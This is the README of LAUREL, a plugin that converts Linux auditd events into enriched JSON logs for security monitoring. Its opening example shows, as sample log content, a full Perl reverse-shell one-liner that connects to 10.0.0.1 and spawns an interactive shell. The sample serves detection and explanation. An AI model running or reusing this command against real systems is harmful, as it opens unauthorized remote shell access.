![logo](laurel.svg)
# Linux Audit – Usable, Robust, Easy Logging

[![Build Status](https://github.com/threathunters-io/laurel/actions/workflows/build.yml/badge.svg)](https://github.com/threathunters-io/laurel/actions/workflows/build.yml)

LAUREL is an event post-processing plugin for _auditd(8)_ to improve its usability in modern security monitoring setups.

Documentation corresponding to the latest stable release can be found [here](https://github.com/hillu/laurel/tree/v0.4.1).

## Motivation

TLDR: Instead of audit events that look like this…
```
type=EXECVE msg=audit(1626611363.720:348501): argc=3 a0="perl" a1="-e" a2=75736520536F636B65743B24693D2231302E302E302E31223B24703D313233343B736F636B65742…
```
…turn them into JSON logs where the mess that your pen testers/red teamers/attackers are trying to make becomes apparent at first glance:
```
{ … "EXECVE":{ "argc": 3,"ARGV": ["perl", "-e", "use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};"]}, …}
```
This happens at the source because _LAUREL_ runs on the host where the audit events are generated. The event even contains useful information about the spawning process:
```
"PARENT_INFO":{"ID":"1643635026.276:327308","comm":"sh","exe":"/usr/bin/dash","ppid":3190631}
```

Logs produced by the Linux Audit subsystem and _auditd(8)_ contain information that can be very useful in a SIEM context (if a useful rule set has been configured). However, the format is not well-suited for at-scale analysis: Events are usually split across different lines that have to be merged using a message identifier. Files and program executions are logged via `PATH` and `EXECVE` elements, but a limited character set for strings causes many of those entries to be hex-encoded. For a more detailed discussion, see [Practical _auditd(8)_ problems](practical-auditd-problems.md).

_LAUREL_ solves these problems by consuming audit events, parsing, transforming, enriching them, and writing them out as a separate JSON-based log. All information that was part of the original audit log is kept intact. _auditd(8)_ is not replaced as the consumer of audit messages from the Linux kernel. Instead, _auditd's_ plugin interface (previously called _"audisp"_) is used, therefore _LAUREL.. can peacefully coexist with other consumers of audit events (e.g. some EDR products).

The chapter [_LAUREL_ installation instructions](INSTALL.md) contains instructions on how to set up and configure usage of the plugin.

Details about the log format are described in the [JSON-based log format](json-format.md) chapter.

We developed this tool because we were not content with feature sets and performance characteristics of existing projects and products. Please refer to the [Performance](performance.md) chapter for details.

## Audit rules

Currently, _LAUREL_ comes with no explicit recommendations on what to log. This is left as an exercise to the user. A good starting point for an audit ruleset is <https://github.com/Neo23x0/auditd>.

_LAUREL_ will currently work best if _End Of Event_ record are not suppressed, so rules like

> `-a always,exclude -F msgtype=EOE`

should be removed.

## Events with context

Every event that is caused by a syscall or filesystem rule is annotated with information about the parent of the process that caused the event. If available, `id` points to the message corresponding to the last `execve` syscall for this process:

``` json
"PARENT_INFO": {
  "ID": "1643635026.276:327308",
  "comm": "sh",
  "exe": "/usr/bin/dash",
  "ppid": 1532
}
```

## Adding more context: Keys and process labels

Audit events can contain a key, a short string that can be used to filter events. _LAUREL_ can be configured to recognize such keys and add them as keys to the process that caused the event. These labels can also be propagated to child processes. This is useful to avoid expensive JOIN-like operations in log analysis to filter out noise.

Consider the following audit rule that set keys for _apt_ and _dpkg_ invocations:
```
-w /usr/bin/apt-get -p x -k software_mgmt
```
Let's configure _LAUREL_ to turn the `software_mgmt` key into a process label that is propagated to child processes:
``` ini
[label-process]

label-keys = [ "software_mgmt" ]
propagate-labels = [ "software_mgmt" ]
```
Together with a ruleset that logs _execve(2)_ and variants, this will cause every event directly caused by `apt-get` and its subprocesses to be labelled `software_mgmt`.

For example, running `sudo apt-get update` on a Debian/bullseye system with a few sources configured, the following subprocesses labelled `software_gmt` can be observed in _LAUREL's_ audit log:

- `apt-get update`
- `/usr/bin/dpkg --print-foreign-architectures`
- `/usr/lib/apt/methods/http`
- `/usr/lib/apt/methods/https`
- `/usr/lib/apt/methods/https`
- `/usr/lib/apt/methods/http`
- `/usr/lib/apt/methods/gpgv`
- `/usr/lib/apt/methods/gpgv`
- `/usr/bin/dpkg --print-foreign-architectures`
- `/usr/bin/dpkg --print-foreign-architectures`

This sort of tracking also works for package installation or removal. If some package's post-installation script is behaving suspiciously, a SIEM analyst will be able to make the connection to the software installation process by inspecting a single event.

## License

GNU General Public License, version 3

## Authors

- Hilko Bengen <<bengen@hilluzination.de>>
- Sergej Schmidt <<sergej@msgpeek.net>>

The logo was created by Birgit Meyer <<hello@biggi.io>>.
